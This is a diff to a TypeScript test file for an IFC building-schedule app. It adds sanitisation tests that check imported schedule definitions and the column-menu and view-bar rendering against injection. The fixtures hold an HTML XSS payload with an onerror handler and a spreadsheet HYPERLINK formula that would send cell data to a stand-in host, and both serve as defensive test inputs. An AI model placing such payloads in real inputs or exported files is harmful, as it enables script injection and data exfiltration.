@@ -9,10 +9,18 @@ import { candidateRows, runSchedule, type GrandRow } from '../../../src/schedule
 import { planComputed } from '../../../src/schedule/schedule/computed';
 import { formatCell, formatNumber } from '../../../src/schedule/schedule/format';
 import { csvCell } from '../../../src/schedule/export/csv';
-// Phase 2 (2026-09-25): the inspector, the coverage sweep and the window's state are ported now.
-import { renderInspector } from '../../../src/renderer/schedule-ui/inspector';
+// Phase 2 (2026-09-25): the coverage sweep and the window's state are ported now. v1.5.0,
+// phase 2: the inspector is gone; its Align control and its summaries are the column menu's and
+// the view bar's (ifcTable's own hardening test, 2026-11-05).
+import { renderColumnMenu, toggleColumnMenu, toggleMore } from '../../../src/renderer/schedule-ui/columnMenu';
 import { buildCoverage } from '../../../src/renderer/schedule-ui/coverage';
+import { closePopover } from '../../../src/renderer/schedule-ui/popover';
 import { state as blankState, type AppState } from '../../../src/renderer/schedule-ui/state';
+import { renderViewBar } from '../../../src/renderer/schedule-ui/viewBar';
+import { installFakeDom } from './support/fakeDom';
+
+// The column menu and popover look their anchor up in the document; nothing here is clicked.
+installFakeDom();
 
 const meta: ModelMeta = {
   fileName: 'f.ifc', schema: 'IFC4', projectName: '', authoringTool: '',
@@ -164,6 +172,45 @@ describe('imported schedules are sanitised', () => {
     expect(d.sort.length).toBe(4);
   });
 
+  // ifcTable's security fix of 2026-11-07 (7336b89), ported for SGVue v1.5.0: every route a
+  // definition takes in — a .schedule.json, a saved setup, a project file, the assistant and
+  // the Schedules port — is read by parseScheduleDef.
+  it('never lets a calculated name through as an object', () => {
+    // An object here became the column heading and reached exceljs, which wrote it as a
+    // live formula. The name must come back as text, or the entry must go.
+    const evil = {
+      ...base,
+      columns: [{ field: { kind: 'formula', id: 'c1' } }],
+      calculated: [{
+        id: 'c1', kind: 'formula', formula: 'A * 2',
+        name: { formula: 'HYPERLINK("http://x/?d="&A2,"Area")', result: 'Area', length: 4 },
+      }],
+    };
+    for (const c of parseScheduleDef(evil).calculated ?? []) expect(typeof c.name).toBe('string');
+  });
+
+  it('drops calculated entries with an unknown kind, a non-string id or formula, or a bad field', () => {
+    const d = parseScheduleDef({
+      ...base,
+      calculated: [
+        { id: 'a', name: 'A', kind: 'script', formula: '1' },
+        { id: 7, name: 'B', kind: 'formula', formula: '1' },
+        { id: 'c', name: 'C', kind: 'formula', formula: { formula: 'X' } },
+        { id: 'd', name: 'D', kind: 'percentage', ofField: { kind: 'core', key: 'expressId' } },
+      ],
+    });
+    expect(d.calculated).toEqual([]);
+  });
+
+  it('keeps a well-formed calculated entry unchanged', () => {
+    const calculated = [
+      { id: 'c1', name: 'Area x', kind: 'formula', formula: 'Width * Height', unitKind: 'area', result: 'number' },
+      { id: 'c2', name: 'Big', kind: 'formula', formula: 'Width > 1', result: 'yesNo', yesNo: true },
+      { id: 'c3', name: 'Share', kind: 'percentage', ofField: { kind: 'prop', pset: '*', prop: 'Width' } },
+    ];
+    expect(parseScheduleDef({ ...base, calculated: structuredClone(calculated) }).calculated).toEqual(calculated);
+  });
+
   it('rejects a file whose columns are all unusable', () => {
     expect(() => parseScheduleDef({ ...base, columns: [{ nope: 1 }, 'x', null] }))
       .toThrow(ScheduleImportError);
@@ -198,11 +245,15 @@ describe('the Align control says what the table does', () => {
   const pressed = (html: string, v: 'left' | 'center' | 'right') =>
     new RegExp(`data-v="${v}"[^>]*aria-pressed="true"`).test(html);
 
+  // The column menu's Align control (the Format tab's, until v1.5.0).
   const inspect = (col: Column) => {
     const store = build(1, () => 1);
     const def: ScheduleDef = { ...emptySchedule('S', ['IfcWall']), columns: [col] };
-    const state = { ...blankState, store, def, open: 'format' } as unknown as AppState;
-    return renderInspector(state, store, buildCoverage(store, ['IfcWall']), runSchedule(store, def));
+    const state = { ...blankState, store, def } as AppState;
+    toggleColumnMenu(0);
+    const html = renderColumnMenu(state, store, buildCoverage(store, ['IfcWall']), runSchedule(store, def));
+    closePopover();
+    return html;
   };
 
   it('presses Right for a column with a total and no explicit align', () => {
@@ -218,11 +269,11 @@ describe('the Align control says what the table does', () => {
   });
 });
 
-describe('the inspector escapes what it summarises', () => {
-  // The five collapsed section headers show a live summary built from property names out
-  // of the IFC file and values the user typed — neither is trusted. They were interpolated
-  // raw, so a filter value of `<img onerror=…>` reached the DOM as markup.
-  it('escapes filter values, field headings and level names in section summaries', () => {
+describe('the view bar and the column menu escape what they show', () => {
+  // Chips read filter values and headings straight out of the definition — values the user
+  // typed and property names out of the IFC file, neither trusted. (The inspector's tab
+  // summaries were the first place this was found and fixed; these are their successors.)
+  it('escapes filter values, field headings and level names', () => {
     const store = build(1, () => 1, () => 'E0');
     const hostile = '"><img src=x onerror=alert(1)>';
     const def: ScheduleDef = {
@@ -231,8 +282,11 @@ describe('the inspector escapes what it summarises', () => {
       filters: [{ field: { kind: 'core', key: 'name' }, op: 'contains', value: hostile }],
       sort: [{ field: { kind: 'core', key: 'name' }, dir: 'asc' }],
     };
-    const state = { ...blankState, store, def, open: null } as unknown as AppState;
-    const html = renderInspector(state, store, buildCoverage(store, ['IfcWall']), runSchedule(store, def));
+    const state = { ...blankState, store, def } as AppState;
+    toggleColumnMenu(0);
+    const html = renderViewBar(state, store)
+      + renderColumnMenu(state, store, buildCoverage(store, ['IfcWall']), runSchedule(store, def));
+    closePopover();
 
     // No tag is ever formed, and the quote that would break out of an attribute is escaped.
     expect(html).not.toContain('<img');
@@ -240,5 +294,36 @@ describe('the inspector escapes what it summarises', () => {
     // The text is still shown to the user — escaped, not dropped.
     expect(html).toContain('&lt;img src=x onerror=alert(1)&gt;');
     expect(html).toContain('&quot;&gt;&lt;img');
+  });
+
+  // CodeQL js/xss-through-dom (PR #21): a def is the user's text after the window history's JSON
+  // round trip, and a saved setup or an opened .schedule.json carries whatever it was given —
+  // so a number the menu reads off it is not trusted to be a number. `format.decimals` reached
+  // the Decimals box's `value="…"` raw.
+  it('escapes a column\'s decimals and width, even when they are not numbers', () => {
+    const store = build(1, () => 1);
+    const hostile = '"><img src=x onerror=alert(1)>';
+    const col = { ...colW, width: hostile, format: { decimals: hostile } } as unknown as Column;
+    const def: ScheduleDef = { ...emptySchedule('S', ['IfcWall']), columns: [col] };
+    const state = { ...blankState, store, def } as AppState;
+    toggleColumnMenu(0);
+    toggleMore();
+    const html = renderColumnMenu(state, store, buildCoverage(store, ['IfcWall']), runSchedule(store, def));
+    closePopover();
+
+    expect(html).toContain('data-act="fmt-decimals"');
+    expect(html).toContain('data-act="fmt-width"');
+    expect(html).not.toContain('<img');
+    expect(html).toContain('value="&quot;&gt;&lt;img src=x onerror=alert(1)&gt;"');
+  });
+
+  it('draws an ordinary decimals value exactly as before', () => {
+    const store = build(1, () => 1);
+    const def: ScheduleDef = { ...emptySchedule('S', ['IfcWall']), columns: [{ ...colW, format: { decimals: 2 } }] };
+    const state = { ...blankState, store, def } as AppState;
+    toggleColumnMenu(0);
+    const html = renderColumnMenu(state, store, buildCoverage(store, ['IfcWall']), runSchedule(store, def));
+    closePopover();
+    expect(html).toMatch(/data-act="fmt-decimals" data-defcol="0" value="2"/);
   });
 });
